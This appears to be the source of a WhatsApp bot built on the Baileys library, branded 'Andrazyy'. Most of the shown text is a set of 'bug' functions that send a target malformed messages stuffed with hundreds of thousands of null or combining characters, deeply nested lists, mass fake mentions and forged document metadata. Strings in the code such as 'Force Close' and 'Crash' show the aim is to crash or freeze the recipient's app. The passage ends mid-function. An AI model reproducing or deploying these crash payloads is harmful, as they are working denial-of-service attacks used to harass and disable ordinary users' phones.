require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = Andrazyy = async (Andrazyy, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? Andrazyy.user.id.split(":")[0] + "@s.whatsapp.net" || Andrazyy.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await Andrazyy.decodeJid(Andrazyy.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await Andrazyy.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./start/lib/media/Andrazyy.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./start/lib/media/Andrazyy.jpg')
const Andrazyyreply = async (teks) => {
return Andrazyy.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `Agler Forger gen 9`,
body: `🔴 Andrazyy Dev`,
previewType: "VIDEO",
thumbnail: RC,
sourceUrl: `https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q`,
mediaUrl: `https://i.ibb.co/0yzbz02m/1059.jpg`
}
},
text: teks
}, {
quoted: m
})
}

const bugres = 'Andrazyy in processs'
const cicitzy = 'bug ini tidak akan berhenti, jika kamu tidak melepas sumber aktif nya'

// function bug //
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "Andrazyy" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await Andrazyy.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function InvisiPayload(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "𐎟💦⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "𐎟💦⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await Andrazyy.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
    
async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐌𝐒𝐆𝐒͢𝐏𝐀𝐌͢ 🐉⃝⃝𐎟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Andrazyy.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  
async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: Andrazyy.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© Andrazyy",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "Agler Forger gen 9"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/Andrazyy_Offc",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "Andrazyy",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 Andrazyy ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© Agler Forger",
sourceUrl: "se me?",
sourceId: "Agler Forger",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await Andrazyy.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}

async function NewIos(target, Ptcp = true) {
Andrazyy.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "𑲭𑲭𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("")
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "🆘⃢⃝⃝⃝⃝⃝△𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            virtexId: Andrazyy.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Andrazyy" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
                footerText: "🆘⃢⃝⃝⃝⃝⃝△𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Agler Forger Gen 9" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Agler Forger Gen 9" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Andrazyy official" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/Andrazyy_Offc",
              buttonTitle: "🆘⃢⃝⃝⃝⃝⃝△𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '🆘⃢⃝⃝⃝⃝⃝△𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "🆘⃢⃝⃝⃝⃝⃝△𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await Andrazyy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await Andrazyy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await Andrazyy.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}
async function invc2(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🐉⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⏤𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲͟͟͞͞𝐈𝐧𝐯𝐜⏤𝐕𝟑.𝟎.𝟎͟͟͞📵͞",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Andrazyy"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Andrazyy.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
 // end function //

 // FUNC BUG TEMBUS UI SISTEM 🔥
async function DocBug(target) {
 let virtex = "🐉⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉";
   Andrazyy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🐉⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await Andrazyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🐉⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🐉⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "🔥⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await Andrazyy.relayMessage(target, {
					ephemeralMessage: {
						message: {
